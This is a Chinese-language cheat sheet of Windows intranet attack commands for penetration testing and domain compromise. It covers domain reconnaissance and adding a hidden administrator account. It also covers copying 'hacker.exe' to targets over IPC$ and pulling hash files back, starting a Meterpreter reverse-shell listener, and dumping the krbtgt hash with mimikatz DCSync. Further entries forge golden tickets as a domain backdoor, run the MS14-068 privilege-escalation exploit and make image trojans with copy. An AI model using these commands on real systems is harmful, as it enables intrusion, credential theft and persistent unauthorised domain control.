常用命令

查看内网相关信息

  • 查看远程主机进程

    • tasklist /s 10.10.10.10 /u administrator /p 1qaz@WSX

  • 内网其他主机名称(基于netbios)

    • nbtstat -A ip

  • 查看当前已登录用户(登录3389会挤掉已登录用户，所以拿到3389账号后先查看已登录用户再决定是否3389上去)

    • query user

  • 获取域用户列表

    • net user /domain

  • 获取域管理员列表

    • net group "domain admins" /domain

  • 获取域控制器列表

    • net group "domain controllers" /domain

  • 查看域内机器

    • net group "domain cpmputers" /domain

windows命令执行

  • 设置环境变量
  • 双引号
  • 转义符(^)
  • 逗号、分号代替空格

MSF快捷开启监听

  • handler -p windows/meterpreter/reverse_tcp -P 8080 -H 192.168.1.1

windows中文乱码

  • chcp 65001

添加可3389用户

  • net user test$ password /add
  • net localgroup administrators test$ /add

IPC连接

  • 建立IPC连接net use \\ip\ipc$ password /user:username
  • 复制本地文件到目标服务器 copy hacker.exe \\ip\C$\windows\temp
  • 复制目标服务器文件到本地 copy \\ip\C$\windows\temp\hash.txt
  • 常见的连接错误编号及错误原因
    编号 原因
    5 拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限
    51 Windows无法找到网络路径：网络有问题
    53 找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）
    67 找不到网络名：你的lanmanworkstation服务未启动；目标删除了ipc$
    1219 提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连
    1326 未知的用户名或错误密码：原因很明显了
    1792 试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动。（连接域控会出现此情况）
    2242 此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码

黄金票据

查看krbtgt相关信息

  • mimikatz lsadump::dcsync /domain:de1ay.com /user:krbtgt

需要的信息

  • 域内用户
  • 该用户的域sid
  • 域名
  • krbtgt ntlm hash

制作

  • 右键目标->access->golden ticket（CS）

黄金票据的用途=>权限维持

  • 把域内普通用户提升为域管理员，相当于通过域控在域内留了一个特殊的后门

MS14-068

这里注意，在成功后，使用DC的IP地址进行访问时，还是不可访问的，是因为使用ip地址进行ipc连接时，采用的认证协议为NTLM协议；使用DC的主机名访问可以成功，是因为使用主机名进行ipc连接时，采用的认证协议为kerberos协议。也就是说，账密、hash等采用的是NTLM协议；ticket等票据采用的是kerberos协议

  • 补丁号：KB3011780(systeminfo|findstr 3011780)
  • 域用户账号、密码、域用户sid、域名
  • C:\ms14-068.exe -u username@test.org -p password -s sid -d DC.test.org
  • mimikatz kerberos::purge
  • mimikatz kerberos::ptc ***.ccache

windows中copy与xcopy

  • copy只能拷贝到根目录，不能拷贝到子目录；xcopy能
    • copy C:/1.exe C:/user/1.exe（N）
    • xcopy C:/1.exe C:/user/1.exe（Y）
  • copy可以把两个文件合二为一，如图片马制作；xcopy不能
